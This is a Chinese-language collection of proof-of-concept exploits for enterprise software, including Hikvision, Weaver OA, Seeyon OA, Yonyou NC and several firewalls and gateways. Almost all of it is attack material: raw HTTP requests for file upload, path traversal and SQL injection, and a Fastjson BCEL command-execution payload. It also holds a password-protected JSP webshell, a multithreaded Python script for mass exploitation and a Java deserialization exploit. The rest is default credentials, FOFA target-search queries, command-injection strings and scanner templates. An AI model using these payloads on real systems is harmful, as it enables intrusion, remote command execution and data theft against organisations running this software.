# Web漏洞（历史漏洞和乱七八糟的漏洞）

## 海康威视isecure center 综合安防管理平台存在任意文件上传漏洞

```
# 文件上传
POST /center/api/files;.js HTTP/1.1
Host: 127.0.0.1
User-Agent: python-requests/2.26.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Length: 257
Content-Type: multipart/form-data; boundary=ea26cdac4990498b32d7a95ce5a5135c

--ea26cdac4990498b32d7a95ce5a5135c
Content-Disposition: form-data; name="file"; filename="../../../../../bin/tomcat/apache-tomcat/webapps/clusterMgr/153107606.txt"
Content-Type: application/octet-stream

332299402
--ea26cdac4990498b32d7a95ce5a5135c--
# 上传以后访问/clusterMgr/153107606.txt;.js
```

## 海康威视综合安防Fastjson不出网利用

```
# Fastjson不出网利用目前公开的已知的poc有两个： 
# com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl
# org.apache.tomcat.dbcp.dbcp2.BasicDataSource
# TemplatesImpl利用链有限制的。由于该字段在fastjson1.2.22版本引入，所以只能影响1.2.22-1.2.24
# 使用条件 
# 1. parseObject(input,Object.class,Feature.SupportNonPublicField)
# 2. parse(input,Feature.SupportNonPublicField)
# 第二种利用方式则需要应用部署在tomcat应用环境中，因为tomcat环境自带tomcat-dbcp.jar，而在tomcat中的 com.sun.org.apache.bcel.internal.util.ClassLoader 的loadclass方法中可以进行bcel字节码的加载。
# 以下是第二种方法的利用。
POST /bic/ssoService/v1/applyCT HTTP/1.1
Host: *
User-Agent: Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36
Content-Length: 5727
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Connection: close
Content-Type: application/json
Referer: *
Testcmd: whoami

{"CTGT":{ "a": {"@type": "java.lang.Class","val": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource"},"b": {"@type": "java.lang.Class","val": "com.sun.org.apache.bcel.internal.util.ClassLoader"},"c": {"@type": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource","driverClassLoader": {"@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"},"driverClassName": "$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$a5Wyx$Ug$Z$ff$cd$5e3$3b$99$90dCB$W$uG$N$b09v$b7$a1$95B$c2$99$90$40J$S$u$hK$97P$db$c9$ec$q$3bd3$Tfg$J$a0$b6$k$d4$D$8fZ$8f$daPO$b4$ae$b7P$eb$s$U9$eaA$b1Z$8fzT$ad$d6zk$f1$f6$8f$da$f6$B$7c$bf$99$N$d9$84$ad$3c$3e$sy$be$f9$be$f7$7b$ef$f7$f7$be3y$fc$e2$p$a7$A$dc$80$7f$89$Q1$m$60P$84$PI$b6h$Cv$f3$Y$e2$91$f2$a3$E$c3$8c$a4$f30x$8c$88t$de$p$c2D$9a$JY$C2$ecr$_$8fQ$B$fb$E$ec$e7q$80$R$5e$c3$e3$b5$ec$f9$3a$R$d5$b8S$c4$5dx$3d$5b$de$m$e2$8dx$T$5b$O$K$b8$5bD7$de$cc$e3$z$ec$fcV$Bo$T$d1$84C$C$de$$$e0$j$3c$de$v$e0$5d$C$ee$R$f0n$k$f7$Kx$P$8f$f7$96$a0$B$efc$cb$fb$F$dc$t$e0$D$C$ee$e71$s$e00$T$bc$93$z$P$I$f8$a0$80$P$J$f8$b0$80$8f$88$f8$u$3e$c6$a8G$E$7c$5c$c0$t$E$3c$u$e0$93$C$b2$3c$3e$c5$e3$d3$o6$e03l$f9$ac$88$cf$e1$f3$o$d6$e3$L$C$be$c8$9eG$d9r$8c$89$3e$c4$7c$fc$S$d3$f4$b0$88$_$p$c7c$9c$83o$b5$a6k$d6Z$O$eeP$dd$z$i$3cmFB$e5P$d6$a5$e9jOf$b8_5$7b$e5$fe$UQ$fc$a3$a6f$a9$adFb$3f$879$a1$ae$dd$f2$5e9$9a$92$f5$c1$e8$d6$fe$dd$aab$b5$f4$b52$f1$d2$98$r$xC$dd$f2$88$zE$89$a4$U$da$b9$k$e2$m$b6$efS$d4$RK3$f44$H$ef$a0ju$90$c0$ca$o$aa$K$u1$cb$d4$f4$c1$96$ba$x$99xLPY8$I$ab$95$94$j$B$8f$e3$94$40$ca$_$r$97$c7$pd$_fdLE$ed$d0$98$fbe$bd$c6$b0$o$5b$edJ$d2$880$5d$Sz$b0$95C$ada$OF$e4$RYI$aa$R$cb$e6$88d$y$z$V$e9$cf$MDZ$f7$5bj$5b2$a3$PI8$81$afH8$89Sd$$$adZ$ec$82B$u$9b$f2$a9$z$r$a7$89$e2$eak$95p$gg$q$3c$8a$afr$u$9f$e94$87$8a$vR$a7n$a9$83$aa$c9$i$f9$g$8f$afK$f8$G$ceJx$M$e78$f0$Jc$H$cb$b6$84o2$3d$8bf$Y$ea1$ac$O$p$a3$t$$$e7$93C$rc$89$e8$9aa$7b$dd$9a$Z$YPM$w$e6$a8$v$8fpX8$r$dfc$c42J$b2$5b$b5$92$c6$94$b8$84$c7$f1$z$O$Lf$b2uhj$aa$90$eb$db8$c7$bc$7d$82R$_$e1$3b$f8$ae$84$ef$e1$fb$94v$JO$e2$H$S$7e$88$l$91$ebV$d2T$e5DZ$c2N$f4$91_$7d$F$95$eb$b5$afZ$q$fc$YO$91s$ea$3eU$91$f0$T$fc$94$f6I$cb$oG$7d$96l$S$$8$E$a6$84$b6gt$ddA$a0$cfJj$e9$da$eb$c8FR$d6$T$v$W$a0o0e$f4$cb$a9$7c$fc$8e$40AV$c4$R$d3P$d4t$da0$a98$b3l$WV$ddh$97$96$b6$q$fc$MO$b3$I$7eN$d07$d5$3d$iJ$c8$f4v5$3dB$f8dx$a7$d3fr$97$99$v$9f$JH$c2A$af$9a$b6TB$93$84_$e0$Zb$t$5c$Q$f6$ad$MY$f2$cb$89$c4$a4$u$cf$f8$94$e1$E$ed$8ctD$97$87$a9$v$7e$v$e1Y$fcJ$c2$afY$g$7c$a3$9a$9e0F$e9$9e$b8$o$94$T$82QT$a1c$b4_$d3$a3$e9$q$j$c3$ca$qpl$efc$8a$ac$ebLw$cd$94$5b$db$9c$40$5b3Z$w$e1$60$ea7$S$7e$8b$df$f1$f8$bd$84$3f$e0$8f$8c$f2$tR$b5k$83$84$e7p$5e$c2$9f$f1$94$84$bf$e0$af$S$b6$p$s$e1o$f8$3b$8f$7fH$f8$tsi$9eb$MG$H$e4$b4$b5$3bm$e8$d1$bd$99Tt$aay$a8$f9$a7$ac$9a$ea$40$8a$60$j$b5$812$zMN$a9g$d4$3f$df$cc$U$db$80a$f6P$w8$y$J$fd$f7f$b7$f1N$S$r$ba$3a$da$a9$a7$zYWHjv$a8$c8$40$m$U$f5$c6$b7$b5S$aa$8a$c8WP57$aaJJ6$d5$84$83$7e$O$eb$8b$d8$ee$bbB$b6$d0$d2d$bc$8e$Gf1$d4$c9$a6$5e$cd$cb$b1Py5$7d$af1D$3e$af$w63$af$q$V$NL$m$ef$f3$p$a62T$y$3d$M$ac$93$W$cb$LB$cd$X$s$7c$95$yO$ab$p$a9$x$r$V$b1$cc$88j$w$8e$d1$aab$f2l$da$T$e87$u$Mx$9a$dd$a1$9e$d0NFv$db$3d$bc$b4H$c0E$a3$xU2$a6$a9$ea$d6$qf$a6W7$3f4$a8$7fI$abs$d8d$g$Z$9a$W$c1$o$7c$f6$VC$Y1$3b$I$9b$ae$ed2$E$F$c5$d0$zYc$af$a2y$85$8e$b6$re3$a6$ee$c9$a8$E$b4$96$ba$9d$USZ$3b$a0$dao$c7N$96$88$ce$a2$n$f0Z$ba$7dx$c4$dao$f3$ed$9c$3e0$f6$d3$9c$Yv$a6$Lu$v$r$95$b1$z$bdJE$$$fbYb$Z$5d$c6$a8j$b6$c9l$uU$87$8a$f4$TK$b9$97Z$c3$b4$98$83$85Z$f2S$a1e$da$7b$tOt$S$da$a9$8fdhnQ$ea$86$d9k$3d$_$ac$Z$d1$82$L$S$af$J$V$bd$60$96$a5LZ$dd$a8$a6$b4az_$d1LZ$f6$f2$81$V$O$_$d6$3b$ba$ba$cfr$b0$9d$7f$a1zBu$7d$ad$O$fa$f2$99$d2$Y$b9$sT$a8$60$ea$86t$cc$$F$t$9d$96$e1$98$c6b$fa$e2$R$c1$7e$3c$e0$d8$x$9f$d6mt$ba$86$9e$i$3d$bd$f5$e3$e0$8e$d1$86$c3$cd$b4$fa$i$o$89$d0T$84$8b$b1r$a3$f4$91$e8$r$ea$8b$B$d7$E$dc$3d$e1$i$3c$dd$e1$80$d7w$S$be$b8$3b$c0$c7$e2$9e$87$m$c4$e2$5e$b6$e6$e0o$f4$9e$84$Yw7$Q$dd$d9$9d$40I$dc$3d$O$89$Il$dbp$8a$ed$89$b3tG$7d$O$b3$Ce$k$5bQ$98$u$e5$f5$k$5b$a2$d1$be$cd$e2P$b3$t$Q$b0m$G$w$3d$93$e6$c8D$d8$937Al$ddWS$d2$fe$ff$x9F$99$A$M$faN$ae$b0$9f$e3$98M$U$96$af$b5$u$a3$b5$83$f2$b6$89$b2$b4$99h$9dt$bf$9d8o$82$85$z8$80$$$dcG$rx$98h$e3$94$fe$e3T$80$d3$94$d5$a7$89$f3$F$f4$d2$_0$H$ee$e7a$f2x$d5$f3$d8$c8$e3$96$L$d8$c0c$H$8f$5b$R$cfW$ad$8e$caA$l$TN9$f0$A$dcv9Vr$b6$d7$U$96$f8$m$aa$c3$N9TugQ$da$ec$a1$C$cd$e9$c9$5ez$ae$f11H$tP$jo$YG$cd$e9FO$O$c1F$S$98$7b$944$96$a2$92$be$e4$ab$f3A$y$87D$eb$O$3a$dd$K$9e$y$95b$X$dd$dfF$f7$afF$Nn$t$ac$dc$81EPP$8b$E$c2$Y$m$feA$db$f1$Kx$$$80$e7$b1$8b$9c$ed$e1q$9b_$wpY$m$e1$3c$d8$dc$s$9dJ$A$d7$cd$ee$96$J$cc$cba$7e$e0$9a$J$y8$83$85$f4$d7$e5$5e3$bf$e1$d4$R$d7$f5$N$f3$97$f7$84$cf$ba$96$90$fb$8b$9a$3dAO$60q$O$d7$kvU$d1$ee$V$b4$hs$95$84$D$b5$q$d6$ec$Nz$l$c5$921$ee$a5$a07$b0$94$I$81el$J$d9WY$I$cd$be$y$f7$y$5d$d5$db$s$g$9a$7d$ee$V$7c$V$l$f4$jG$p$87$p$dc$a9$a0$af$8a$3f$8e$b0$L$cdBP$ID$f2$gY$fd$a3n$aa$3f$d5$3e$e8$a5$8dH$85o$f6$3b$X$d7$e5q$d3$U$b3o$3dyX7$c5$D$cb$c7q$3d$83$c8$Z41$9f$cfb$uH$89$be$e10$94$a0$9fI$be$d2$91tZ$a3$3c$e8$f7$5c$ee$88$K$9cc$7d$c0$e0$e5$b0$ae$f0N$g$89$7b$f2$96$fc$de$Z$96$e2d$c3$W$f1$b4$5c$cd$b3$hgz6$96$f7$ec$de$ff$c1$b3$c0$ca$J$ac$ca$a19$d0$c2$w$80$m$f5$7c$TY$5b$cd$5c$5cC$zO$dedQ$9d$a7$aee$d4u$O$b5Y$M$faO$60$7d$fc$E6$c4$83$e28Zsh$cba$e38$da$D$j9l$caas$O$9d$T$b8$89$e2$m$d7Jl$d7$c6P5w$M$VA$ff$E$b6$e4$d0$e50$Q$c5$97$85$ff$m$cfe$_$ae$9e$3c$b8$b8$ec$85$t$b2$f0la$8d$d9$D$99pYG$f0$earm$a5$a7$83$e9$p$I$d1$w$d0$c9O$cdZ$82$f9$84$f1E$84$ecZ$ccB$3d5$edZ$94S$dbV$90t$r$c9W$93$86$d9$84$ec$wh$84$f8$M$e6$e2$m$e6$e1$k$92$ba$9f$d0$7f$M$L$f0$M$W$e2$3c$Wq$d5X$ccu$e2Zn$L$96p$fb$b0$94$bb$h$cb$b8$a3$Iq$e7Q$e7$aa$40$bd$ab$92$90U$8b$88k9$9a$5c$x$b0$dc$b5$Ks$5d$eb$b0$c2$d5$86$h$5d$j$uqua$jy$b9$c6$b5$8d$feU$ed$b5$bb$ae$fc$o$aa9$k$L$b9K4$t$7c$f6$8e$c7$ed$3c$ee$a0$v$A$da$ca$d4d$b3x$f4s$X$f0$a4$3d$Yv$bc$84C$dby$uuR$c5$L$f0$bd$I$ef$r$g$3fn$5b$Q$f87$bc$ad$q$c3$e6y$82$d4$bb$a0$fe$H$d8$3e$ebc$Z$Q$A$A"}}
}
```

## 泛微E-Mobile 6.0 存在命令执行

```
POST /client.do HTTP/1.1
Host: {{Hostname}}
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTm8YXcJeyKDClbU7
Content-Length: 1147

------WebKitFormBoundaryTm8YXcJeyKDClbU7
Content-Disposition: form-data; name="method"

getupload
------WebKitFormBoundaryTm8YXcJeyKDClbU7
Content-Disposition: form-data; name="uploadID"

1';CREATE ALIAS if not exists MzSNqKsZTagmf AS CONCAT('void e(String cmd) throws java.la','ng.Exception{','Object curren','tRequest = Thre','ad.currentT','hread().getConte','xtClass','Loader().loadC','lass("com.caucho.server.dispatch.ServletInvocation").getMet','hod("getContextRequest").inv','oke(null);java.la','ng.reflect.Field _responseF = currentRequest.getCl','ass().getSuperc','lass().getDeclar','edField("_response");_responseF.setAcce','ssible(true);Object response = _responseF.get(currentRequest);java.la','ng.reflect.Method getWriterM = response.getCl','ass().getMethod("getWriter");java.i','o.Writer writer = (java.i','o.Writer)getWriterM.inv','oke(response);java.ut','il.Scan','ner scan','ner = (new java.util.Scann','er(Runt','ime.getRunt','ime().ex','ec(cmd).getInput','Stream())).useDelimiter("\\A");writer.write(scan','ner.hasNext()?sca','nner.next():"");}');CALL MzSNqKsZTagmf('whoami');--
------WebKitFormBoundaryTm8YXcJeyKDClbU7--
```

## 华夏erp账号密码泄露

```
/jshERP-boot/user/getAllList;.ico
```

## 孚盟云 SQL注入漏洞

```
/Ajax/AjaxMethod.ashx?action=getEmpByname&Name=1%27
```

## 泛微OA SQL注入漏洞

```
# 使用以下SQL注入语句获取密码，然后MD5解密登录系统。
/js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select%20password%20as%20id%20from%20HrmResourceManager
```

## 帆软报表获取管理员权限

```
# 访问URL后台，默认密码：admin/123456
/ReportServer?op=fr_auth&cmd=ah_loginui&_=1619832545582
```

## 用友GRP-U8行政事业财务管理软件 SQL注入

```
/Proxy

cVer=9.8.0&dp=<?xml version="1.0" encoding="GB2312"?><R9PACKET version="1"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION><NAME>AS_DataRequest</NAME><PARAMS><PARAM><NAME>ProviderName</NAME><DATA format="text">DataSetProviderData</DATA></PARAM><PARAM><NAME>Data</NAME><DATA format="text">select 1,user,db_name(),host_name(),@@version</DATA></PARAM></PARAMS></R9FUNCTION></R9PACKET>
```

## 泛微e-cology V8 WorkflowServiceXml SQL注入

```
POST /services/WorkflowServiceXml HTTP/1.1
Cookie: ecology_JSessionid=aaaBARi23vekqguNfrVDy
Host: {{Hostname}}
Content-Type: text/xml;charset=UTF-8
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.10) Gecko/20050920 Firefox/1.0.6

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="webservices.services.weaver.com.cn">
  <soapenv:Header/>
  <soapenv:Body>
      <web:getUserId>
    <web:string>loginId = ? ;*--</web:string>
<web:string>xx</web:string>
      </web:getUserId>
  </soapenv:Body>
</soapenv:Envelope>
```

## 致远 OA A8 htmlofficeservlet getshell 漏洞

```
/seeyon/htmlofficeservlet

DBSTEP V3.0     355             0               666             DBSTEP=OKMLlKlV
OPTION=S3WYOSWLBSGr
currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66
CREATEDATE=wUghPB3szB3Xwg66
RECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6
originalFileId=wV66
originalCreateDate=wUghPB3szB3Xwg66
FILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdN1liN4KXwiVGzfT2dEg6
needReadFile=yRWZdAS6
originalCreateDate=wLSGP4oEzLKAz4=iz=66
<%@ page language="java" import="java.util.*,java.io.*" pageEncoding="UTF-8"%><%!public static String excuteCmd(String c) {StringBuilder line = new StringBuilder();try {Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) {line.append(temp+"\n");}buf.close();} catch (Exception e) {line.append(e.getMessage());}return line.toString();} %><%if("asasd33445".equals(request.getParameter("pwd"))&&!"".equals(request.getParameter("cmd"))){out.println("<pre>"+excuteCmd(request.getParameter("cmd")) + "</pre>");}else{out.println(":-)");}%>6e4f045d4b8506bf492ada7e3390d7ce

webshell地址为：https://www.0-sec.org/seeyon/test123456.jsp，密码为：asasd3344。

####DBSTEP V3.0编解码脚本
from sys import argv

letters = "gx74KW1roM9qwzPFVOBLSlYaeyncdNbI=JfUCQRHtj2+Z05vshXi3GAEuT/m8Dpk6"

def base64_encode(input_str):
    str_ascii_list = ['{:0>8}'.format(str(bin(ord(i))).replace('0b', '')) for i in input_str]
    output_str = ''
    equal_num = 0
    while str_ascii_list:
        temp_list = str_ascii_list[:3]
        if len(temp_list) != 3:
            while len(temp_list) < 3:
                equal_num += 1
                temp_list += ['0' * 8]
        temp_str = ''.join(temp_list)
        temp_str_list = [temp_str[x:x + 6] for x in [0, 6, 12, 18]]
        temp_str_list = [int(x, 2) for x in temp_str_list]
        if equal_num:
            temp_str_list = temp_str_list[0:4 - equal_num]
        output_str += ''.join([letters[x] for x in temp_str_list])
        str_ascii_list = str_ascii_list[3:]
    output_str = output_str + '=' * equal_num
    return output_str

def base64_decode(input_str):
    str_ascii_list = ['{:0>6}'.format(str(bin(letters.index(i))).replace('0b', '')) for i in input_str if i != '=']
    output_str = ''
    equal_num = input_str.count('=')
    while str_ascii_list:
        temp_list = str_ascii_list[:4]
        temp_str = ''.join(temp_list)
        if len(temp_str) % 8 != 0:
            temp_str = temp_str[0:-1 * equal_num * 2]
        temp_str_list = [temp_str[x:x + 8] for x in [0, 8, 16]]
        temp_str_list = [int(x, 2) for x in temp_str_list if x]
        output_str += ''.join([chr(x) for x in temp_str_list])
        str_ascii_list = str_ascii_list[4:]
    return output_str

if __name__ == "__main__":
    if len(argv) == 2:
        print(base64_decode(argv[1]))
    elif len(argv) == 3:
        if argv[1] == '-d':
            print(base64_decode(argv[2]))
        else:
            print(base64_encode(argv[2]))
    else:
        print("Seeyon OA /seeyon/htmlofficeservlet param encode/decode")
        print("Usage:")
        print("python %s encoded_str" % argv[0])
        print("python %s -d encoded_str" % argv[0])
        print("python %s -e raw_str" % argv[0])
```

## Sapido多款路由器命令执行漏洞

```
# 访问以下页面执行命令即可。
http://xxx.xxx.xxx.xxx:1080/syscmd.htm
```

##  紫光电子档案管理系统 任意文件上传漏洞

```
# shell地址：/uploads/company1/fonds1/cms/20230914/响应包中回显的文件名。
POST /System/Cms/upload.html?token= HTTP/1.1
Host: ip:port
User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36
Connection: close
Content-Length: 544
Accept: application/json, text/javascript, */*; q=0.01
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary3enKbCUwg60aGZcr

------WebKitFormBoundary3enKbCUwg60aGZcr
Content-Disposition: form-data; name="userID"

admin
------WebKitFormBoundary3enKbCUwg60aGZcr
Content-Disposition: form-data; name="fondsid"

1
------WebKitFormBoundary3enKbCUwg60aGZcr
Content-Disposition: form-data; name="comid"

1
------WebKitFormBoundary3enKbCUwg60aGZcr
Content-Disposition: form-data; name="token"

1
------WebKitFormBoundary3enKbCUwg60aGZcr
Content-Disposition: form-data; name="files[]"; filename="11.txt"

12345ewq
------WebKitFormBoundary3enKbCUwg60aGZcr--
```

## 天融信上网行为管理RCE

```
GET /view/IPV6/naborTable/static_convert.php?blocks[0]=||%20echo%20'123'%20>>%20/var/www/html/1.txt%0A HTTP/1.1
Host: 127.0.0.1:8088
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 1567


# 然后访问/1.txt
```

## 锐捷EG易网关 管理员账号密码泄露

```
POST /login.php

username=admin&password=admin?show+webmaster+user
```

## 泛微OA E-Cology getSqlData SQL注入漏洞

```
/Api/portal/elementEcodeAddon/getSqlData?sql=select%20@@version
```

## 用友 NC FileReceiveServlet 反序列化RCE漏洞

```
# 文件上传

import requests
import threadpool
import urllib3
import sys
import argparse

urllib3.disable_warnings()
proxies = {'http': 'http://localhost:8080', 'https': 'http://localhost:8080'}
header = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
    "Content-Type": "application/x-www-form-urlencoded",
    "Referer": "https://google.com",
}

def multithreading(funcname, filename="url.txt", pools=5):
    works = []
    with open(filename, "r") as f:
        for i in f:
            func_params = [i.rstrip("\n")]
            works.append((func_params, None))
    pool = threadpool.ThreadPool(pools)
    reqs = threadpool.makeRequests(funcname, works)
    [pool.putRequest(req) for req in reqs]
    pool.wait()

def wirte_targets(vurl, filename):
    with open(filename, "a+") as f:
        f.write(vurl + "\n")
        return vurl
    
def exp(u):
    uploadHeader = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
        "Content-Type": "multipart/form-data;",
        "Referer": "https://google.com"
    }
    uploadData = "\xac\xed\x00\x05\x73\x72\x00\x11\x6a\x61\x76\x61\x2e\x75\x74\x69\x6c\x2e\x48\x61\x73\x68\x4d\x61\x70\x05\x07\xda\xc1\xc3\x16\x60\xd1\x03\x00\x02\x46\x00\x0a\x6c\x6f\x61\x64\x46\x61\x63\x74\x6f\x72\x49\x00\x09\x74\x68\x72\x65\x73\x68\x6f\x6c\x64\x78\x70\x3f\x40\x00\x00\x00\x00\x00\x0c\x77\x08\x00\x00\x00\x10\x00\x00\x00\x02\x74\x00\x09\x46\x49\x4c\x45\x5f\x4e\x41\x4d\x45\x74\x00\x09\x74\x30\x30\x6c\x73\x2e\x6a\x73\x70\x74\x00\x10\x54\x41\x52\x47\x45\x54\x5f\x46\x49\x4c\x45\x5f\x50\x41\x54\x48\x74\x00\x10\x2e\x2f\x77\x65\x62\x61\x70\x70\x73\x2f\x6e\x63\x5f\x77\x65\x62\x78"
    shellFlag="t0test0ls"
    uploadData+=shellFlag
    try:
        req1 = requests.post(u + "/servlet/FileReceiveServlet", headers=uploadHeader, verify=False, data=uploadData, timeout=25)
        if req1.status_code == 200 :
            req3=requests.get(u+"/t00ls.jsp",headers=header, verify=False, timeout=25)

            if  req3.text.index(shellFlag)>=0:
                printFlag = "[Getshell]" + u+"/t00ls.jsp"  + "\n"
                print (printFlag)
                wirte_targets(printFlag, "vuln.txt")
    except :
        pass
    #print(printFlag, end="")


if __name__ == "__main__":
    if (len(sys.argv)) < 2:
        print('useage : python' +str(sys.argv[0]) + ' -h')
    else:
        parser =argparse.ArgumentParser()
        parser.description ='YONYOU UC 6.5 FILE UPLOAD!'
        parser.add_argument('-u',help="url -> example http://127.0.0.1",type=str,dest='check_url')
        parser.add_argument('-r',help="url list to file",type=str,dest='check_file')
        args =parser.parse_args()
        if args.check_url:
            exp(args.check_url)
        
        if(args.check_file):
            multithreading(exp, args.check_file, 8)
            
# java exp
import java.io.*;
import java.util.HashMap;
import java.util.Map;

public class App {
    public static void main(String[] args) throws Exception {
        String url="http://192.168.40.222";
        Map<String, Object> metaInfo=new HashMap<String, Object>();
        metaInfo.put("TARGET_FILE_PATH","webapps/nc_web");
        metaInfo.put("FILE_NAME","cmd.jsp");
        ByteArrayOutputStream baos=new ByteArrayOutputStream();
        ObjectOutputStream oos=new ObjectOutputStream(baos);
        oos.writeObject(metaInfo);
        InputStream in=App.class.getResourceAsStream("cmd.jsp");
        byte[] buf=new byte[1024];
        int len=0;
        while ((len=in.read(buf))!=-1){
            baos.write(buf,0,len);
        }
        HttpClient.post(url+"/servlet/FileReceiveServlet",baos.toByteArray());
        HttpResult result=HttpClient.get(url+"/cmd.jsp?cmd=echo+aaaaaa");
        if(result.getData().contains("aaaaaa")){
            System.out.println("shell路径:"+url+"/cmd.jsp?cmd=whoami");
        }else{
            System.out.println("上传shell失败或者漏洞不存在");
        }
    }
}
```

## 用友NC 控制台密码绕过

```
/uapws/index.jsp

# nuclei poc

id: yonyou_console_uapws

info:
  name: yonyou_console_uapws
  author: bjx
  severity: high
  tags: yonyou,yonyouoa,oa,bjxsec
  description: fofa   app="用友-UFIDA-NC"
requests:
  - method: GET
    path:
      - "{{BaseURL}}/uapws/"

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "basictable"
          - "<title>WS-Console</title>"
        part: body
        condition: and

      - type: status
        status:
          - 200
```

## H3C SecParh堡垒机 data_provider.php 远程命令执行

```
# 获取用户登录cookie
/audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=admin
# 执行命令
/audit/data_provider.php?ds_y=2019&ds_m=04&ds_d=02&ds_hour=09&ds_min40&server_cond=&service=$(id)&identity_cond=&query_type=all&format=json&browse=true
```

## 锐捷RG-UAC统一上网行为管理与审计系统管理员密码泄露

```
fofa:title="RG-UAC登录页面" && body="admin"
打开目标网站
不用进行任何操作，直接查看源码然后Ctrl+F搜索字符串"admin"
```

## 网康防火墙远程命令执行漏洞

```
# 执行结果：http://ip:port/checkTest.txt
POST /directdata/direct/router HTTP/1.1
Host: ip:port
Cookie: PHPSESSID=43h4kc2ln41b2oi2ipj485p7h3; ys-active_page=s%3A
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Dnt: 1
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 205
Connection: close

{"action":"SSLVPN_Resource","method":"deleteImage","data":[{"data":["/var/www/html/d.txt;echo 'This website has a vulnerability!!!' >/var/www/html/checkTest.txt"]}],"type":"rpc","tid":17,"f8839p7rqtj":"="}
```

## 好视通视频会议系统(fastmeeting) toDownload.do接口存在任意文件读取漏洞

```
GET /register/toDownload.do?fileName=../../../../../../../../../../../../../../windows/win.ini HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept: */*
Connection: Keep-Alive
```

## 泛微OA E-Office V10 OfficeServer 任意文件上传漏洞

原文连接：https://www.fiversec.com/posts/e99786b9.html

```
POST /eoffice10/server/public/iWebOffice2015/OfficeServer.php HTTP/1.1
Host: xxx.xxx.xxx.xxx
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Content-Length: 395
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJjb5ZAJOOXO7fwjs
Accept-Encoding: gzip, deflate
Connection: close

------WebKitFormBoundaryJjb5ZAJOOXO7fwjs
Content-Disposition: form-data; name="FileData"; filename="1.jpg"
Content-Type: image/jpeg

<?php phpinfo();unlink(__FILE__);?>
------WebKitFormBoundaryJjb5ZAJOOXO7fwjs
Content-Disposition: form-data; name="FormData"

{'USERNAME':'','RECORDID':'undefined','OPTION':'SAVEFILE','FILENAME':'test12.php'}
------WebKitFormBoundaryJjb5ZAJOOXO7fwjs--

# xray poc
name: poc-yaml-eweaver-eoffice-v10-officeserver-upload
manual: true
transport: http
set:
    r1: randomInt(8000, 10000)
    r2: randomLowercase(6)
rules:
    r1:
        request:
            cache: true
            method: POST
            path: /eoffice10/server/public/iWebOffice2015/OfficeServer.php
            headers:
                Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJjb5ZAJOOXO7fwjs
            body: "\
                ------WebKitFormBoundaryJjb5ZAJOOXO7fwjs\r\n\
                Content-Disposition: form-data; name=\"FileData\"; filename=\"1.jpg\"\r\n\
                Content-Type: image/jpeg\r\n\
                \r\n\
                <?php echo md5({{r1}});unlink(__FILE__);?>\r\n\
                ------WebKitFormBoundaryJjb5ZAJOOXO7fwjs\r\n\
                Content-Disposition: form-data; name=\"FormData\"\r\n\
                \r\n\
                {'USERNAME':'','RECORDID':'undefined','OPTION':'SAVEFILE','FILENAME':'{{r2}}.php'}\r\n\
                ------WebKitFormBoundaryJjb5ZAJOOXO7fwjs--\r\n\
                "
        expression: response.status == 200
    r2:
        request:
            cache: true
            method: GET
            path: /eoffice10/server/public/iWebOffice2015/Document/{{r2}}.php
        expression: response.status == 200 && response.body.bcontains(bytes(substr(md5(string(r1)), 0, 31)))
expression: r1() && r2()
detail:
    author: IMF5er
    links:
